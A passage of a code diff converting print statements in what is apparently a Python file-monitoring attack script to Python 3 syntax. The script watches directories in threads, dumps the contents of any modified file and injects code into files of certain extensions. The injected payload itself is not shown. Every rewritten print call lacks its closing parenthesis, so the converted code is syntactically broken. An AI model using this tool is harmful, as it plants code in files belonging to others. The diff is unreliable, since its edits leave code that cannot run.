@@ -39,7 +39,7 @@ def inject_code(full_filename,extension,contents):
     fd.write(full_contents)
     fd.close()
 
-    print "[\o/] Injected code."
+    print("[\o/] Injected code."
     
     return
     
@@ -78,23 +78,23 @@ def start_monitor(path_to_watch):
                 full_filename = os.path.join(path_to_watch, file_name)
                 
                 if action == FILE_CREATED:
-                    print "[ + ] Created %s" % full_filename
+                    print("[ + ] Created %s" % full_filename
                 elif action == FILE_DELETED:
-                    print "[ - ] Deleted %s" % full_filename
+                    print("[ - ] Deleted %s" % full_filename
                 elif action == FILE_MODIFIED:
-                    print "[ * ] Modified %s" % full_filename
+                    print("[ * ] Modified %s" % full_filename
                     
                     # dump out the file contents
-                    print "[vvv] Dumping contents..."
+                    print("[vvv] Dumping contents..."
                     
                     try:
                         fd = open(full_filename,"rb")
                         contents = fd.read()
                         fd.close()
-                        print contents
-                        print "[^^^] Dump complete."
+                        print(contents
+                        print("[^^^] Dump complete."
                     except:
-                        print "[!!!] Failed."
+                        print("[!!!] Failed."
                     
                     filename,extension = os.path.splitext(full_filename)
                     
@@ -102,16 +102,16 @@ def start_monitor(path_to_watch):
                         inject_code(full_filename,extension,contents)
                     
                 elif action == FILE_RENAMED_FROM:
-                    print "[ > ] Renamed from: %s" % full_filename
+                    print("[ > ] Renamed from: %s" % full_filename
                 elif action == FILE_RENAMED_TO:
-                    print "[ < ] Renamed to: %s" % full_filename
+                    print("[ < ] Renamed to: %s" % full_filename
                 else:
-                    print "[???] Unknown: %s" % full_filename
+                    print("[???] Unknown: %s" % full_filename
         except:
             pass
         
         
 for path in dirs_to_monitor:
     monitor_thread = threading.Thread(target=start_monitor,args=(path,))
-    print "Spawning monitoring thread for path: %s" % path
+    print("Spawning monitoring thread for path: %s" % path
     monitor_thread.start()
